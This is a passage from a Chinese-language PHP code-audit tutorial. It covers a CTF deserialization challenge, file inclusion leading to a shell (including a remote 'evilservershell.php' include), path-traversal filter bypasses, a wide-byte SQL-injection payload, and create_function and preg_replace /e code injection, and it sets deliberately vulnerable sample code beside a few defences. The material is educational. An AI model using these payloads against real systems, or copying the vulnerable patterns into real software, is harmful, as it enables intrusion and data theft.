class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- showimg.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		<span class="comment">//stripos — 查找字符串首次出现的位置（不区分大小写）</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#?class=O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;</span></span><br><span class="line">&lt;!-- answer.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = class Shield();</span><br><span class="line">$g = serialize($x);</span><br><span class="line"><span class="keyword">echo</span> $g;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- shield.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//flag is in pctf.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>原理：</p>
<p>include()/include_once()，require()/require_once()，中的变量可控</p>
<p>利用过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上传图片（含有php代码的图片） </span><br><span class="line">读文件，读php文件 </span><br><span class="line">包含日志文件getshell </span><br><span class="line">包含/proc/self/envion文件getshell </span><br><span class="line">如果有phpinfo可以包含临时文件 </span><br><span class="line">包含data://或php://input等伪协议（需要allow_url_include=On)</span><br></pre></td></tr></table></figure></p>
<p>封闭协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 访问共享目录</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'\evilservershell.php'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="提交参数无过滤"><a href="#提交参数无过滤" class="headerlink" title="提交参数无过滤"></a>提交参数无过滤</h2><p>原理:过滤了GPC，但没有过滤其它部分。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上传文件相关变量如<span class="variable">$_FIle</span></span><br><span class="line"><span class="variable">$_GET</span>，<span class="variable">$_POST</span>，<span class="variable">$_Cookie</span>，<span class="variable">$_SERVER</span>，<span class="variable">$_ENV</span>，<span class="variable">$_SESSION</span>，<span class="variable">$_REQUEST</span></span><br><span class="line">HTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响</span><br><span class="line"><span class="variable">$_HTTP_COOKIE_VARS</span></span><br><span class="line"><span class="variable">$_HTTP_ENV_VARS</span></span><br><span class="line"><span class="variable">$_HTTP_GET_VARS</span></span><br><span class="line"><span class="variable">$_HTTP_POST_FILES</span></span><br><span class="line"><span class="variable">$_HTTP_POST_VARS</span></span><br><span class="line"><span class="variable">$_HTTP_SERVER_VARS</span></span><br></pre></td></tr></table></figure>
<p>案例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">AS</span> $_key=&gt;$_value)&#123;</span><br><span class="line">	<span class="keyword">unset</span>($$_key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">AS</span> $_key=&gt;$_value)&#123;</span><br><span class="line">	!ereg(<span class="string">"^\_[A-Z]+"</span>,$_key) &amp;&amp; $$_key=$_POST[$_key];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">AS</span> $_key=&gt;$_value)&#123;</span><br><span class="line">	!ereg(<span class="string">"^\_[A-Z]+"</span>,$_key) &amp;&amp; $$_key=$_GET[$_key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过表单来传值。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://localhost/qibo/member/comment.php?job=ifcom"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"cidDB"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里的gid为查询参数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER                 <span class="comment">//中用户能够控制的变量，php5.0后不受GPC影响</span></span><br><span class="line">QUERY_STRING             <span class="comment">//用户GET方法提交时的查询字符串</span></span><br><span class="line">HTTP_REFERER             <span class="comment">//用户请求的来源变量，在一些程序取得用户访问记录时用得比较多</span></span><br><span class="line">HTTP_USER_AGENT          <span class="comment">//用户的浏览器类型，也用于用户的访问记录的取得</span></span><br><span class="line">HTTP_HOST                <span class="comment">//提交的主机头等内容</span></span><br><span class="line">HTTP_X_FORWARDED_FOR     <span class="comment">//用户的代理主机的信息</span></span><br></pre></td></tr></table></figure></p>
<h2 id="伪造IP"><a href="#伪造IP" class="headerlink" title="伪造IP"></a>伪造IP</h2><p>原理:<br>以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">关键字：</span><br><span class="line">HTTP_</span><br><span class="line">getenv</span><br><span class="line">$_SERVER</span><br><span class="line">服务端：</span><br><span class="line"><span class="keyword">echo</span> getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'REMOTE_ADDR'</span>]; <span class="comment">//访问端（有可能是用户，有可能是代理的）IP</span></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]; <span class="comment">//代理端的（有可能存在，可伪造）</span></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]; <span class="comment">//用户是在哪个IP使用的代理（有可能存在，也可以伪造）</span></span><br><span class="line">客户端：</span><br><span class="line">注意发送的格式：</span><br><span class="line">CLIENT-IP:<span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">X-FORWARDED-<span class="keyword">FOR</span>:<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个玩意恒成立的。不管有没有clientip</span><br><span class="line">【strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)】</span><br></pre></td></tr></table></figure>
<h2 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h2><h3 id="缺少-和-限定"><a href="#缺少-和-限定" class="headerlink" title="缺少^和$限定"></a>缺少^和$限定</h3><h3 id="数组绕过正则"><a href="#数组绕过正则" class="headerlink" title="数组绕过正则"></a>数组绕过正则</h3><p>【\A[ _a-zA-Z0-9]+\z】</p>
<h3 id="str-replace路径穿越"><a href="#str-replace路径穿越" class="headerlink" title="str_replace路径穿越"></a>str_replace路径穿越</h3><p>原理<br>str_replace的过滤方式为其search参数数组从左到右一个一个过滤。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 这里可以被绕过，因为是对.和/或\的组合的过滤，所以单独的..或\/没有检测到。</span></span><br><span class="line"><span class="comment">## 方法1</span></span><br><span class="line"><span class="comment">## 五个点加///</span></span><br><span class="line"><span class="comment">## 方法2</span></span><br><span class="line"><span class="comment">## ...././/</span></span><br><span class="line">$dir = str_replace(<span class="keyword">array</span>(<span class="string">'..\\'</span>, <span class="string">'../'</span>, <span class="string">'./'</span>, <span class="string">'.\\'</span>), <span class="string">''</span>, trim($dir),$countb);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/br&gt;替换数量'</span>;</span><br><span class="line"><span class="keyword">echo</span> $countb;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 这里有对单独的.进行过滤，所以无法绕过。</span></span><br><span class="line">$file = str_replace(<span class="keyword">array</span>(<span class="string">'../'</span>, <span class="string">'\\'</span>, <span class="string">'..'</span>), <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'/'</span>, <span class="string">''</span>), $_GET[<span class="string">'file'</span>],$counta);</span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/br&gt;替换数量'</span>;</span><br><span class="line"><span class="keyword">echo</span> $counta;</span><br></pre></td></tr></table></figure>
<h2 id="short-open-tag-on-短标签"><a href="#short-open-tag-on-短标签" class="headerlink" title="short_open_tag=on 短标签"></a>short_open_tag=on 短标签</h2><p>原理：<br>当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；<br>格式为：&lt;?xxxx;?&gt; –&gt; &lt;?xxx;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Go0s@ubuntu:~$ cat test.php</span><br><span class="line">&lt;?=<span class="string">"helloworld"</span>;</span><br><span class="line">Go0s@ubuntu:~$ curl 127.0.0.1/test.php</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure></p>
<h2 id="file-put-contents第二个参数传入数组"><a href="#file-put-contents第二个参数传入数组" class="headerlink" title="file_put_contents第二个参数传入数组"></a>file_put_contents第二个参数传入数组</h2><p>原理：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(file,data,mode,context)</span><br><span class="line">file	必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</span><br><span class="line">data	可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ?filename=xiaowei.php&amp;data[]=&lt;?php&amp;data[]=%0aphpinfo();</span></span><br><span class="line"><span class="comment">## 这个要从burp去传，因为后面的【?】会被理解为参数而截断</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'data'</span>];</span><br><span class="line">$file = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">$current = file_get_contents($file);</span><br><span class="line">file_put_contents($file, $a);</span><br></pre></td></tr></table></figure>
<h2 id="单引号和双引号"><a href="#单引号和双引号" class="headerlink" title="单引号和双引号"></a>单引号和双引号</h2><p>原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">$s = <span class="string">"I am a 'single quote string' inside a double quote string"</span>; </span><br><span class="line">$s = <span class="string">'I am a "double quote string" inside a single quote string'</span>; </span><br><span class="line">$s = <span class="string">"I am a 'single quote string' inside a double quote string"</span>; </span><br><span class="line">$s = <span class="string">'I am a "double quote string" inside a single quote string'</span>;</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">$abc=<span class="string">'I love u'</span>; </span><br><span class="line"><span class="keyword">echo</span> $abc <span class="comment">//结果是:I love u </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$abc'</span> <span class="comment">//结果是:$abc </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$abc"</span> <span class="comment">//结果是:I love u </span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">$a=<span class="string">"$&#123;@phpinfo()&#125;"</span>; <span class="comment">//可以解析出来</span></span><br><span class="line"><span class="meta">&lt;?php</span> $a=<span class="string">"$&#123;@phpinfo()&#125;"</span>;<span class="meta">?&gt;</span> <span class="comment">//@可以为空格，tab，/**/ ，回车，+，-，!，~,\等</span></span><br></pre></td></tr></table></figure>
<h3 id="查询语句缺少单引号"><a href="#查询语句缺少单引号" class="headerlink" title="查询语句缺少单引号"></a>查询语句缺少单引号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Select * from table where id=$id"</span> <span class="comment"># 有注入</span></span><br><span class="line"><span class="string">"Select * from table where id="</span>.$id.<span class="string">" limit 1"</span> <span class="comment"># 有注入</span></span><br><span class="line"><span class="string">"Select * from table where id='$id'"</span> <span class="comment"># 无注入</span></span><br><span class="line"><span class="string">"Select * from table where id='"</span>.$id.<span class="string">"' limit 1"</span> <span class="comment"># 无注入</span></span><br></pre></td></tr></table></figure>
<h2 id="宽字符注入"><a href="#宽字符注入" class="headerlink" title="宽字符注入"></a>宽字符注入</h2><p>原理<br>常见转码函数：<br>iconv()<br>mb_convert_encoding()<br>addslashes<br>防御：<br>用mysql_real_escape_string</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ?username=tom&amp;password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+</span></span><br><span class="line"><span class="comment">## %df把\给吃掉</span></span><br><span class="line">$pwd = addslashes($pwd);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$query = <span class="string">"select * from user where uname='"</span>.$uname.<span class="string">"' and pwd='"</span>.$pwd.<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="跳转无退出"><a href="#跳转无退出" class="headerlink" title="跳转无退出"></a>跳转无退出</h2><p>原理:<br>没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;myclass-&gt;notice(<span class="string">'alert("系统已安装过");window.location.href="'</span>.site_url().<span class="string">'";'</span>);</span><br><span class="line"><span class="comment">## 2</span></span><br><span class="line">header(<span class="string">"location: ../index.php"</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2><p>由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。<br>如%2527，两次urldecode会最后变成’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">base64_decode -- 对使用 MIME base64 编码的数据进行解码</span><br><span class="line">base64_encode -- 使用 MIME base64 对数据进行编码</span><br><span class="line">rawurldecode -- 对已编码的 URL 字符串进行解码</span><br><span class="line">rawurlencode -- 按照 RFC 1738 对 URL 进行编码</span><br><span class="line">urldecode -- 解码已编码的 URL 字符串</span><br><span class="line">urlencode -- 编码 URL 字符串</span><br><span class="line">unserialize/serialize</span><br><span class="line">字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等</span><br></pre></td></tr></table></figure></p>
<h2 id="前端可控变量填充导致XSS"><a href="#前端可控变量填充导致XSS" class="headerlink" title="前端可控变量填充导致XSS"></a>前端可控变量填充导致XSS</h2><p>当html里的链接是变量时，易出现XSS。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=&#123;#、echo、print、printf、vprintf、<span class="tag">&lt;<span class="name">%=$test%</span>&gt;</span></span><br><span class="line">img scr=&#123;#$list.link_logo#&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">shell_exec()</span><br><span class="line"><span class="keyword">echo</span> `whoami`; <span class="comment">//反引号调用shell_exec()函数</span></span><br><span class="line">popen()和proc_open() <span class="comment">//不会返回结果</span></span><br><span class="line">array_map($arr,$array); <span class="comment">//为数组的每个元素应用回调函数arr,如$arr = "phpinfo"</span></span><br><span class="line">popen(<span class="string">'whoami &gt;&gt;D: /2.txt'</span>, <span class="string">'r'</span>); <span class="comment">//这样就会在D下生成一个2.txt。</span></span><br><span class="line">preg_replace()</span><br><span class="line">ob_start()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure>
<p>防范方法：<br>使用自定义函数或函数库来替代外部命令的功能<br>使用escapeshellarg 函数来处理命令参数<br>使用safe_mode_exec_dir 指定可执行文件的路径</p>
<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><p>create_function构造了一个return后面的语句为一个函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#?sort_by="]);&#125;phpinfo();/*</span></span><br><span class="line"><span class="comment">#sort_function就变成了 return 1 * strnatcasecmp($a[""]);&#125;phpinfo();/*"], $b[""]);&#125;phpinfo();/*"]);</span></span><br><span class="line"><span class="comment">#前面闭合，然后把后面的全部注释掉了。</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sort_by=$_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$sorter=<span class="string">'strnatcasecmp'</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</span><br><span class="line">$sort_function = <span class="string">' return 1 * '</span> . $sorter . <span class="string">'($a["'</span> . $sort_by . <span class="string">'"], $b["'</span> . $sort_by . <span class="string">'"]);'</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure></p>
<h3 id="mb-ereg-replace-的-e模式"><a href="#mb-ereg-replace-的-e模式" class="headerlink" title="mb_ereg_replace()的/e模式"></a>mb_ereg_replace()的/e模式</h3><p>原理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:</span><br><span class="line">string mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= &quot;msr&quot;  ] )</span><br><span class="line">当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.</span><br></pre></td></tr></table></figure></p>
<h3 id="preg-replace-e模式执行命令"><a href="#preg-replace-e模式执行命令" class="headerlink" title="preg_replace /e模式执行命令"></a>preg_replace /e模式执行命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?str=[phpinfo()]</span></span><br><span class="line"><span class="comment"># 这里使用/e模式，所以第二个参数\\1这里可以执行。</span></span><br><span class="line"><span class="comment"># 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\1，执行。</span></span><br><span class="line">preg_replace(<span class="string">"/\[(.*)]/e"</span>,<span class="string">'\\1'</span>,$_GET[<span class="string">'str'</span>]);</span><br></pre></td></tr></table></figure>
<h2 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func</span><br><span class="line">call_user_func_array</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?a=assert</span></span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$b);</span><br></pre></td></tr></table></figure>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure>
<h3 id="eval-和assert-代码执行"><a href="#eval-和assert-代码执行" class="headerlink" title="eval()和assert()代码执行"></a>eval()和assert()代码执行</h3><p>当assert()的参数为字符串时 可执行PHP代码。<br>区别：assert可以不加;，eval不可以不加;。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">" phpinfo(); "</span>);【√】 <span class="keyword">eval</span>(<span class="string">" phpinfo() "</span>);【X】</span><br><span class="line">assert(<span class="string">" phpinfo(); "</span>);【√】 assert(<span class="string">" phpinfo() "</span>);【√】</span><br></pre></td></tr></table></figure></p>
